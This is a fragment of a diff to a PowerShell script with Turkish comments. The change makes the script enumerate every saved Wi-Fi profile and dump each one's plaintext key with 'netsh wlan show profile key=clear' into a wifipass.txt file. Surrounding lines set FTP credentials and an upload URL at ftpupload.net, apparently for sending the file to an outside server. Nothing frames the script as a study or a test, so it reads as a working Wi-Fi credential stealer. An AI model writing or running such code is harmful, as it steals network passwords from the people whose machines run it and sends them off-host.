@@ -7,7 +7,26 @@ if (-not $ftpPass) {
 }
 
 $localFile = "$env:USERPROFILE\wifipass.txt"
-netsh wlan show profile name="*" key=clear > $localFile
+
+# Eski dosya varsa sil
+Remove-Item -Path $localFile -ErrorAction SilentlyContinue
+
+# Bütün Wi-Fi profillerini al
+$profiles = netsh wlan show profiles | ForEach-Object {
+    if ($_ -match ":\s(.+)$") {
+        $matches[1].Trim()
+    }
+}
+
+# Her profil için detay al
+foreach ($profile in $profiles) {
+    Add-Content -Path $localFile -Value "=== $profile ===`n"
+
+    $profileDetail = netsh wlan show profile name="$profile" key=clear
+    Add-Content -Path $localFile -Value $profileDetail
+    Add-Content -Path $localFile -Value "`n`n"
+}
+
 
 $ftpUrl = "ftp://ftpupload.net/wifipass.txt"
 
